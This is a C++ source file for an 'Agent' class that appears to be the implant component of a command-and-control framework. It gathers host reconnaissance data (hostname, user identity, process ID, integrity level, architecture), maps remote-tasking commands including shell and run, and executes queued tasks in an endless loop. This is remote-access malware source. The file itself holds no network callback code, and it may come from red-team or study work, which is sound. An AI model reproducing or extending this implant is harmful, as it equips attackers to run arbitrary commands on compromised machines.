#include "Agent.h"
#include "Commands.h"
#include <iostream>
#include <thread>
#include <chrono>
#include <unordered_map>

Agent::Agent(){
	Commands = loadCommands();
	Metadata = generateMetadata();
}

std::unordered_map<std::string, std::string(*)(std::vector<std::string> arguments)> Agent::loadCommands() {
	std::unordered_map<std::string, std::string(*)(std::vector<std::string> arguments)> commands;

	commands["whoami"] = &whoami;
	commands["shell"] = &shell;
	commands["run"] = &run;
	commands["pwd"] = &pwd;
	commands["cd"] = &Cd;
	commands["ls"] = &Ls;

	return commands;
}
AgentMetadata Agent::generateMetadata() {
	std::vector<std::string> arguments;
	AgentMetadata metadata = {
		1,
		GetHostname(),
		Commands["whoami"](arguments),
		GetProcessname(),
		GetCurrentProcessId(),
		GetProcessIntegrityLevel(),
		GetArch()
	};
	return metadata;
}

AgentMetadata Agent::getMetadata(){
	return Metadata;
}

void Agent::addTask(const Task& task){
	Tasks.push(task);
}

Task Agent::getNextTask() {
	Task task = Agent::Tasks.front();
	Tasks.pop();

	return task;
}

void Agent::addResult(const TaskResult& result) { Results.push(result); }

TaskResult Agent::getNextResult() {
	TaskResult result = Results.front();
	Results.pop();
	return result;
}

std::vector<TaskResult> Agent::getTaskResults() {
	std::vector<TaskResult> results_toret;
	while (Results.empty() != true) {
		results_toret.push_back(Results.front());
		Results.pop();
	}
	return results_toret;
}

void Agent::executeTask(Task& task) {
	std::cout << "Executing task: " << task.id << std::endl;

	//Execute Command
	std::string command_output;
	if (Agent::Commands.find(task.command) != Agent::Commands.end()) {
		command_output = Commands[task.command](task.arguments);
	}
	else {
		command_output = "Comando no encontrado";
	}
	
	std::cout << "Commands Output: " << command_output << std::endl;
	TaskResult result = { task.id, command_output };

	Agent::addResult(result);
}

void Agent::Work() {
	while (true) {
		std::cout << "Working Tasks ...." << std::endl;
		if (!Tasks.empty()) {
			Task task = Agent::getNextTask();
			Agent::executeTask(task);
			
		}
		std::this_thread::sleep_for(std::chrono::seconds(1));
	}
}

